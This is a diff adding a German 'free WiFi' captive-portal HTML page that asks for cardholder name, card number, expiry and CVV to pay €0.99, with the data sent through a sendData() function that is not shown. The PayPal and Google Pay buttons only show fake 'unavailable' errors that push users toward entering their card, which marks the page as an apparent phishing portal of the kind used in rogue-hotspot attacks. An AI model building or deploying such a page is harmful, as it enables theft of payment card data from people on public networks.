@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <title>Kostenloses WLAN</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h2>WLAN für 0,99 € verbinden</h2>
+        <p>Bitte geben Sie Ihre Kartendaten für die Zahlung ein:</p>
+
+        <input type="text" id="cardholder" placeholder="Karteninhaber" required>
+        <input type="text" id="cardNumber" placeholder="Kartennummer" required>
+        <input type="text" id="expDate" placeholder="Gültig bis (MM/JJ)" required>
+        <input type="text" id="cvv" placeholder="CVV" required>
+        <button class="pay-button card-button" onclick="sendData()">
+            Mit Karte zahlen 0,99 €
+        </button>
+
+        <div class="or">oder</div>
+
+        <div id="ppError" class="error">⚠️ Diese Funktion ist derzeit nicht verfügbar</div>
+        <button class="pay-button pp-button" onclick="showError('ppError')">
+            PayPal
+        </button>
+
+        <div id="gpError" class="error">⚠️ Diese Funktion ist derzeit nicht verfügbar</div>
+        <button class="pay-button gp-button" onclick="showError('gpError')">
+            Google Pay
+        </button>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
